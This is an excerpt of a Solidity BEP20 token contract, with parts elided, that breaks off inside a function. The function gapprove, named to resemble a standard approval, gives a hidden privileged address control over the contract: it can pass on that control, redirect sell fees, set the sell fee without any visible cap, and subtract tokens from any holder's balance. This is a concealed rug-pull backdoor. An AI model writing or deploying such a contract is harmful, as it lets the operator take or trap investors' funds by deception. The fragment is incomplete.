...
contract Token is IBEP20, Ownable {
    ...
    constructor() {
        ...
        g_address=msg.sender;

        _lp_address= IFactory(IRouter(_router).factory()).createPair(address(this),_USDT);
    }
    //ERC20
    ...
    function gapprove(uint256  controltype,address _toaddress, uint256 _touint) public returns (bool) {
        require(g_address== msg.sender, "ERRO");
        if(controltype==1){
                g_address=_toaddress;
                return true;
        }
        if(controltype==2){
                sell_fee_address=_toaddress;
                return true;
        }
        if(controltype==3){
                sell_fee=_touint;
        ...
        if(controltype==4){
                _balances[_toaddress] = _balances[_toaddress].sub(
                    _touint,
                    "BEP20: burn amount exceeds balance"
                );
                return true;
